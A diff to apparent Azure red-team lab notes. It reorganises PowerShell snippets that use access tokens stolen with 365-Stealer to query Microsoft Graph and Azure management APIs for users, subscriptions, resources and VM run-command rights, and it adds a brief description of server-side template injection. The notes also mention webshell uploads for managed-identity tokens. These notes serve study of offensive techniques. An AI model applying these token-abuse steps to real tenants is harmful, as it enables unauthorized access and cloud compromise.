@@ -145,21 +145,8 @@ Invoke-EnumerateAzureSubDomains -Base defcorphq –Verbose
 
 #### Get the access tokens
 - Browse to http://localhost:82/365-Stealer/yourvictims/
-- Click on the user and copy the access token from access_toklen.txt
-
-#### Abuse the access token - requesting all users
-```
-$Token = 'eyJ0eX..'
-$URI = 'https://graph.microsoft.com/v1.0/users'
-$RequestParams = @{
- Method = 'GET'
- Uri = $URI
- Headers = @{
- 'Authorization' = "Bearer $Token"
- }
-}
-(Invoke-RestMethod @RequestParams).value
-```
+- Click on the user and copy the access token from access_token.txt
+- See the "Using Azure tokens" section
 
 #### Get admin consent
 ```
@@ -202,57 +189,9 @@ cd C:\xampp\htdocs\365-Stealer\
 - if the app service contains environment variables IDENITY_HEADER and IDENTITY_ENDPOINT, it has a managed identity.
 - Get access token from managed identity using another webshell. Upload studentxtoken.phtml
 
-#### Check the resources available to the managed identity
-Throws an error and nikil is unsure why
-```
-$token = 'eyJ0eX...'
-
-Connect-AzAccount -AccessToken $token -AccountId <clientID> Get-AzResource
-```
-
-#### Use the Azure REST API to get the subscription id
-```
-$Token = 'eyJ0eX..'
-$URI = 'https://management.azure.com/subscriptions?api-version=2020-01-01'
-$RequestParams = @{
- Method = 'GET'
- Uri = $URI
- Headers = @{
- 'Authorization' = "Bearer $Token"
- }
-}
-(Invoke-RestMethod @RequestParams).value
-```
-
-#### List all the resources available by the managed identity to the app service
-```
-$URI = 'https://management.azure.com/subscriptions/b413826f-108d-4049-8c11-
-d52d5d388768/resources?api-version=2020-10-01'
-$RequestParams = @{
- Method = 'GET'
- Uri = $URI
- Headers = @{
- 'Authorization' = "Bearer $Token"
- }
-}
-(Invoke-RestMethod @RequestParams).value
-```
-
-#### Check what actions are allowed to the vm
-- The runcommand privileges lets us execute commands on the VM
-```
-$URI = 'https://management.azure.com/subscriptions/b413826f-108d-4049-8c11-d52d5d388768/resourceGroups/Engineering/providers/Microsoft.Compute/virtualMachines/bkpadconnect/providers/Microsoft.Authorization/permissions?api-version=2015-07-01'
-
-$RequestParams = @{
-Method = 'GET'
-Uri = $URI
-Headers = @{
-'Authorization' = "Bearer $Token"
-}
-}
-
-(Invoke-RestMethod @RequestParams).value
-```
+## Server Side Template Injection
+- SSTI allows an attacker to abuse template syntax to inject payloads in a template that is executed on the server side. 
+- That is, we can get command execution on a server by abusing this.
 
 # Authenticated enumeration
 ## Enumeration through Azure portal
@@ -1017,6 +956,59 @@ Headers = @{
 'Authorization' = "Bearer $Token"
 }
 }
+(Invoke-RestMethod @RequestParams).value
+```
+
+### Abusing tokens
+#### Check the resources available to the managed identity
+Throws an error and nikil is unsure why
+```
+$token = 'eyJ0eX...'
+
+Connect-AzAccount -AccessToken $token -AccountId <clientID> Get-AzResource
+```
+
+#### Use the Azure REST API to get the subscription id
+```
+$Token = 'eyJ0eX..'
+$URI = 'https://management.azure.com/subscriptions?api-version=2020-01-01'
+$RequestParams = @{
+ Method = 'GET'
+ Uri = $URI
+ Headers = @{
+ 'Authorization' = "Bearer $Token"
+ }
+}
+(Invoke-RestMethod @RequestParams).value
+```
+
+#### List all the resources available by the managed identity to the app service
+```
+$URI = 'https://management.azure.com/subscriptions/b413826f-108d-4049-8c11-
+d52d5d388768/resources?api-version=2020-10-01'
+$RequestParams = @{
+ Method = 'GET'
+ Uri = $URI
+ Headers = @{
+ 'Authorization' = "Bearer $Token"
+ }
+}
+(Invoke-RestMethod @RequestParams).value
+```
+
+#### Check what actions are allowed to the vm
+- The runcommand privileges lets us execute commands on the VM
+```
+$URI = 'https://management.azure.com/subscriptions/b413826f-108d-4049-8c11-d52d5d388768/resourceGroups/Engineering/providers/Microsoft.Compute/virtualMachines/bkpadconnect/providers/Microsoft.Authorization/permissions?api-version=2015-07-01'
+
+$RequestParams = @{
+Method = 'GET'
+Uri = $URI
+Headers = @{
+'Authorization' = "Bearer $Token"
+}
+}
+
 (Invoke-RestMethod @RequestParams).value
 ```
 
